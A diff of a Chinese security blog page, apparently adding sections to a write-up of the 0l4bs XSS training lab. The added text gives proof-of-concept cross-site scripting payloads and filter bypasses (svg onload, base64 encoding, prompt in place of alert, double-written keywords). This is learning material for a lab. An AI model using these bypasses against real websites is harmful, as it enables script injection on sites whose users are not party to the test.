@@ -353,7 +353,7 @@ var _hmt = _hmt || [];
 <h1 id="测试挑战"><a href="#测试挑战" class="headerlink" title="测试挑战"></a>测试挑战</h1><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>​        可能是自己太菜了吧， 不知道为啥没研究明白第一关什么意思。直接访问1.php 页面空白。没办法down了一下源代码。直接查看一下代码，里面是直接通过status进行的。</p>
 <p><img src="/2020/02/25/0l4bs-XSS/2.png" alt="img"></p>
 <p>​        最终确定代码。直接在URL中插入最简单的payload既可。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1.php?status=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">status=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr></table></figure>
 
 
 
@@ -379,8 +379,31 @@ var _hmt = _hmt || [];
 <p><img src="/2020/02/25/0l4bs-XSS/13.png" alt="img"></p>
 <h2 id="File-Name"><a href="#File-Name" class="headerlink" title="File Name"></a>File Name</h2><p>​        应该是文件名，尝试一下正常的文件测试一下。</p>
 <p><img src="/2020/02/25/0l4bs-XSS/15.png" alt="img"></p>
-<p>​        发现可以但是存在一点小问题。</p>
+<p><img src="/2020/02/25/0l4bs-XSS/16.png" alt="img">        </p>
+<p>发现可以但是存在一点小问题。最终确定payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">"alert(1)"</span>&gt;</span></span></pre></td></tr></table></figure>
 
+<p><img src="/2020/02/25/0l4bs-XSS/17.png" alt="img"></p>
+<h2 id="Base64-Encoding"><a href="#Base64-Encoding" class="headerlink" title="Base64 Encoding"></a>Base64 Encoding</h2><p>​        直接进行base64进行编码paylado</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/25/0l4bs-XSS/18.png" alt="img"></p>
+<h2 id="Removes-Alert"><a href="#Removes-Alert" class="headerlink" title="Removes Alert"></a>Removes Alert</h2><p>​        提示已经说明禁用了alert。其实还可以使用比如：onfirm、prompt</p>
+<p>​        最终payload为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">prompt(<span class="string">'1'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/25/0l4bs-XSS/19.png" alt="img"></p>
+<h2 id="Removes-Script"><a href="#Removes-Script" class="headerlink" title="Removes Script"></a>Removes Script</h2><p>提示已经说明禁用了script直接使用svg</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> /<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/25/0l4bs-XSS/20.png" alt="img"></p>
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>​        因为过滤了某些字符，直接进行双写</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">"alealertrt('xss')"</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/02/25/0l4bs-XSS/21.png" alt="img"></p>
+<h2 id="HTML-Entities"><a href="#HTML-Entities" class="headerlink" title="HTML Entities"></a>HTML Entities</h2>
       </div>
       
       
@@ -392,7 +415,7 @@ var _hmt = _hmt || [];
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-02-26T12:10:23+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-02-26T18:31:24+08:00">
   <a class='notlink'>
     <i class="fas fa-clock" aria-hidden="true"></i>
     <p>更新于 2020年2月26日</p>
@@ -480,6 +503,25 @@ var _hmt = _hmt || [];
       
       
           <div class="prev-next">
+              
+                  <section class="prev">
+                      <span class="art-item-left">
+                          <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
+                          <h4>
+                              <a href="/2020/03/15/%E6%9F%90CMS%E6%B5%8B%E8%AF%95/" rel="prev" title="某CMS测试">
+                                
+                                    某CMS测试
+                                
+                              </a>
+                          </h4>
+                          
+                              
+                              <h6 class="tags">
+                                  <a class="tag" href="/tags/WEB%E5%AD%A6%E4%B9%A0/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> WEB学习</a>
+                              </h6>
+                          
+                      </span>
+                  </section>
               
               
                   <section class="next">
@@ -639,7 +681,7 @@ var _hmt = _hmt || [];
 </header>
 
     <div class='content pure'>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#环境安装"><span class="toc-text">环境安装</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#本地安装"><span class="toc-text">本地安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在线环境"><span class="toc-text">在线环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#测试挑战"><span class="toc-text">测试挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Form"><span class="toc-text">Form</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Agent"><span class="toc-text">User-Agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Refferer"><span class="toc-text">Refferer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie"><span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LocalStorage"><span class="toc-text">LocalStorage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-Page"><span class="toc-text">Login Page</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Name"><span class="toc-text">File Name</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#环境安装"><span class="toc-text">环境安装</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#本地安装"><span class="toc-text">本地安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#在线环境"><span class="toc-text">在线环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#测试挑战"><span class="toc-text">测试挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Form"><span class="toc-text">Form</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Agent"><span class="toc-text">User-Agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Refferer"><span class="toc-text">Refferer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie"><span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LocalStorage"><span class="toc-text">LocalStorage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-Page"><span class="toc-text">Login Page</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Name"><span class="toc-text">File Name</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Base64-Encoding"><span class="toc-text">Base64 Encoding</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Removes-Alert"><span class="toc-text">Removes Alert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Removes-Script"><span class="toc-text">Removes Script</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace"><span class="toc-text">preg_replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-Entities"><span class="toc-text">HTML Entities</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -790,7 +832,7 @@ var _hmt = _hmt || [];
 </header>
 
     <div class='content pure'>
-      <a href="/tags/%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0/" style="font-size: 17.33px; color: #828282">个人学习</a> <a href="/tags/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/" style="font-size: 24px; color: #555">工控安全</a> <a href="/tags/%E5%B7%A5%E6%8E%A7%E6%9D%82%E8%B0%88/" style="font-size: 14px; color: #999">工控杂谈</a> <a href="/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/" style="font-size: 14px; color: #999">等级保护</a> <a href="/tags/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" style="font-size: 20.67px; color: #6c6c6c">靶场记录</a>
+      <a href="/tags/WEB%E5%AD%A6%E4%B9%A0/" style="font-size: 14px; color: #999">WEB学习</a> <a href="/tags/%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0/" style="font-size: 17.33px; color: #828282">个人学习</a> <a href="/tags/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/" style="font-size: 24px; color: #555">工控安全</a> <a href="/tags/%E5%B7%A5%E6%8E%A7%E6%9D%82%E8%B0%88/" style="font-size: 14px; color: #999">工控杂谈</a> <a href="/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/" style="font-size: 14px; color: #999">等级保护</a> <a href="/tags/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" style="font-size: 20.67px; color: #6c6c6c">靶场记录</a>
     </div>
   </section>
 
